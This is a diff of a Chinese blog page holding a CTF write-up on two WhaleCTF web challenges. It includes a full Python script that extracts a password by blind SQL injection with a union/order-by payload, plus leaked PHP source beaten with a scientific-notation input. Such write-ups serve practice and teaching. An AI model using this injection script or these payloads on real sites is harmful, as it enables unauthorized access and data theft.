@@ -117,12 +117,62 @@
                 <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近要做的事太多了，实验班考核、末考、再加上来成都的同学多的一批。。没时间好好学点东西，前两天装Docker，基础太差了，现在Ubuntu上docker都没搭好环境。应对最近的考核，还是刷点题吧</p>
 <h3 id="瞎子摸鱼"><a href="#瞎子摸鱼" class="headerlink" title="瞎子摸鱼"></a>瞎子摸鱼</h3><p>是个Sql注入，一开始有回显我以为是基本的回显注入，后来fuzz发现过滤了函数、Infor、小括号，那基本上与回显注入无缘。我们构造admin是万能函数的时候，发现回显：<br>whaleadmin<br>我猜测这个是用户名，当不构造正确的用户名时，回显：<br>flag in the password content<br>所以后台的语句应该是这样的思路，如果查到用户名存在，则输出用户名的第一个值。若不存在，则返回flag那一堆。。</p>
 <p>一开始我和LinE师傅都没想到用order by来爆破password字段，后来看到一篇类似原题的帖子。。<br><a href="https://www.cnblogs.com/deen-/p/7008939.html" target="_blank" rel="noopener">Inject again 注入 过滤左右括号 order by</a><br>思路挺简单的，就是通过order by的升序排序法进行盲注<br>后来就是写exp了，被LinE师傅嘲讽了一波。。确实py能力太差了= =<br>这里偷偷贴一下LinE师傅的exp：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def send(flag,charset):</span><br><span class="line">    url = &quot;http://ctf.whaledu.com:10801/47g256f48gff/index.php&quot;</span><br><span class="line">    h = &#123;&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;</span><br><span class="line">    for i in range(len(charset)):</span><br><span class="line">        c = flag + charset[i]</span><br><span class="line">        payload = &quot;whaleadmin&apos; union select 1,0,&apos;&#123;&#125;&apos; order by 3#&quot;.format(c)</span><br><span class="line">        d = &quot;username=&#123;&#125;&amp;password=admin&quot;.format(payload)</span><br><span class="line">        r = requests.post(url,data=d,headers=h)</span><br><span class="line">        if &quot;whaleadmin&quot; in r.text:</span><br><span class="line">            return i</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    num = &quot;0123456789&quot;</span><br><span class="line">    a_z = &quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="line">    charset = list(num + a_z)</span><br><span class="line">    for i in range(0,80):</span><br><span class="line">        ret = send(flag, charset)</span><br><span class="line">        flag += charset[ret-1]</span><br><span class="line">        print flag</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<pre><code>#coding:utf-8
+import requests
 
-<h3 id="正则进入"><a href="#正则进入" class="headerlink" title="正则进入"></a>正则进入</h3><p>源码泄露扫描得到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;waht the hell?&quot;;</span><br><span class="line">$flag = &quot;*******&quot;; </span><br><span class="line">if  (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;]) </span><br><span class="line">&#123; </span><br><span class="line">    $password = $_POST[&apos;password&apos;]; </span><br><span class="line">    if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) </span><br><span class="line">    &#123; </span><br><span class="line">        echo &apos;Wrong Format&apos;; </span><br><span class="line">        exit; </span><br><span class="line">    &#125; </span><br><span class="line">    while (TRUE) </span><br><span class="line">    &#123; </span><br><span class="line">        $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;; </span><br><span class="line">        if (6 &gt; preg_match_all($reg, $password, $arr)) </span><br><span class="line">            break; </span><br><span class="line">        $c = 0; </span><br><span class="line">        $ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); </span><br><span class="line">        foreach ($ps as $pt) </span><br><span class="line">        &#123; </span><br><span class="line">            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) </span><br><span class="line">                $c += 1; </span><br><span class="line">        &#125; </span><br><span class="line">        if ($c &lt; 3) break; </span><br><span class="line">        if (&quot;42&quot; == $password) echo $flag; </span><br><span class="line">        else echo &apos;Wrong password&apos;; </span><br><span class="line">        exit; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+def send(flag,charset):
+    url = &quot;http://ctf.whaledu.com:10801/47g256f48gff/index.php&quot;
+    h = {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
+    for i in range(len(charset)):
+        c = flag + charset[i]
+        payload = &quot;whaleadmin&#39; union select 1,0,&#39;{}&#39; order by 3#&quot;.format(c)
+        d = &quot;username={}&amp;password=admin&quot;.format(payload)
+        r = requests.post(url,data=d,headers=h)
+        if &quot;whaleadmin&quot; in r.text:
+            return i
 
-<p>结整段代码来看，我们需要post一个字符串，该字符串的值为42，并且要包含标点、数字、大写字母、小写字母中三个及以上类型，同时匹配次数要不小于6次</p>
+def main():
+    flag = &quot;&quot;
+    num = &quot;0123456789&quot;
+    a_z = &quot;abcdefghijklmnopqrstuvwxyz&quot;
+    charset = list(num + a_z)
+    for i in range(0,80):
+        ret = send(flag, charset)
+        flag += charset[ret-1]
+        print flag
+
+if __name__ == &#39;__main__&#39;:
+    main()</code></pre><h3 id="正则进入"><a href="#正则进入" class="headerlink" title="正则进入"></a>正则进入</h3><p>源码泄露扫描得到：</p>
+<pre><code>&lt;?php
+echo &quot;waht the hell?&quot;;
+$flag = &quot;*******&quot;; 
+if  (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;]) 
+{ 
+    $password = $_POST[&#39;password&#39;]; 
+    if (0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password)) 
+    { 
+        echo &#39;Wrong Format&#39;; 
+        exit; 
+    } 
+    while (TRUE) 
+    { 
+        $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;; 
+        if (6 &gt; preg_match_all($reg, $password, $arr)) 
+            break; 
+        $c = 0; 
+        $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); 
+        foreach ($ps as $pt) 
+        { 
+            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) 
+                $c += 1; 
+        } 
+        if ($c &lt; 3) break; 
+        if (&quot;42&quot; == $password) echo $flag; 
+        else echo &#39;Wrong password&#39;; 
+        exit; 
+    } 
+}
+?&gt;</code></pre><p>结整段代码来看，我们需要post一个字符串，该字符串的值为42，并且要包含标点、数字、大写字母、小写字母中三个及以上类型，同时匹配次数要不小于6次</p>
 <p>构造的payload:<br><code>password=420.00000e-1</code>或者<code>password=42.000000e-0</code></p>
 <p>利用科学计数法，xe(+-)x代表的意思是，x乘以10的x次方，之所以用.我一开始不明白，但是看一下句子猜测的话，这个点的作用应该还是“乘以”，即420乘以10^(-1)，就是42。而且.也把标点位占了，所以构造很巧妙。</p>
 <p>相关链接:<br><a href="http://dcx.sybase.com/1101/zh/dbreference_zh11/rf-sqllanguage-s-4915351.html" target="_blank" rel="noopener">正则表达式语法</a></p>
@@ -132,16 +182,16 @@
            
             <div class="copyright">
                 <div class="name">
-                    <a>本文作者:</a>
+                    <a>Author:</a>
                     <a>Sōsuke</a>
                 </div>
                 <div class="link">
-                    <a>本文链接:</a>
+                    <a>Link:</a>
                     <a class="permalink" href="https://hpdoger.cn/2018/06/06/WhaleCTF的Web题目/">https://hpdoger.cn/2018/06/06/WhaleCTF的Web题目/</a>
                 </div>
                 <div class="license">
-                    <a>版权声明:</a>
-                    <a>本博客所有文章除特别声明外，均采用许可协议 CC BY-NC-SA 3.0 CN。转载请注明出处！</a>
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                 </div>
             </div>
             
@@ -154,7 +204,7 @@
 
 <div class="tip">
 <button class="tip-btn">
-    打赏
+    Tip
 </button>
 <div class="tip-img">
 <ul>
@@ -167,13 +217,13 @@
 <div class="more">
 
     <div class="prev">
-   <a href="/2018/06/06/Web题目/">  CTF中的Web题目</a>
+   <a href="/2018/06/20/一道SCTF写日志getshell/">  记SCTF的一道mysql日志写Shell题目</a>
     </div>
 
 <div></div>
 
     <div class="next">
-    <a href="/2018/05/28/sql简单的注入和常见的waf绕过/"> sql简单的注入和常见的waf绕过 </a>
+    <a href="/2018/06/06/Web题目/"> CTF中的Web题目 </a>
     </div>
     
 </div>
